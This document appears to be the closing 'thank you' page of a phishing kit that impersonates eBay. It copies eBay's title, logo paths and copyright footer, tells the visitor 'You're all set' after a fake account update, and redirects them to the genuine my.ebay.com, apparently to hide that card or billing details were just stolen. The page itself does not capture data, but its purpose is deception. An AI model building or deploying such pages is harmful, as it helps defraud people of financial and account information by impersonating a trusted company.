<?php 

?>

<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Update account information | eBay</title>
<link rel="icon" href="./res/img/icon.png">
<link rel="stylesheet" href="./res/css/update.css">
<script src="./res/js/jquery.js"></script>
<script src="./res/js/validate.js"></script>
<style>
.thankyou img{width:25px;}
</style>
</head>
<body>
<div class="top">
<img src="./res/img/logo.png">
</div>

<div id="errors-content" style="width:100%; text-align:center; display:none;">
<div class="errors">
<div id="errors-msg">
<img src="./res/img/error.png"> We noticed a problem. Please review:
</div>
<div class="errors-list" >
</div>
</div>
</div>
<div class="form">
<div class="thankyou">
<h1><img src="./res/img/check.png"> You're all set.</h1>
</div>
<button id="billing-btn" onclick="go()" class="submit-btn">My account</button>
<button id="cc-btn" onclick="go()" class="submit-btn" style="background:#bebebe; color:white; border:#bebebe;">Sign out</button>
</div>



<div style="width:100%; text-align:center;">
<div class="footer">
© 1995-2020 eBay Inc. <a href="#">User Agreement</a>, <a href="#">Privacy</a> & <a href="#">Cookies</a>.
</div>
</div>


<script>
function go(){
		window.location = "https://my.ebay.com/";
	
}
</script>
</body>
</html>














